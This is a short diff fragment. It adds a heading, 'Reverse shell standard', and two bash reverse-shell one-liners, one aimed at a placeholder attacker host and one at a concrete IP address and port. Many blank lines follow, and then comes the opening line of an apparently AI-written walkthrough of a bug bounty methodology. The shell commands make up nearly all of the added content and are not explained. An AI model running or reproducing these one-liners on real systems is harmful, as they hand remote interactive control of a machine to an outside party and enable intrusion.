@@ -1,3 +1,28 @@
+Reverse shell standard 
+
+
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+bash -i >& /dev/tcp/10.9.1.30/1337 0>&1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 I'll break down this bug bounty hunting methodology step-by-step with detailed explanations of how each tool works and what's happening behind the scenes.
 
 ---
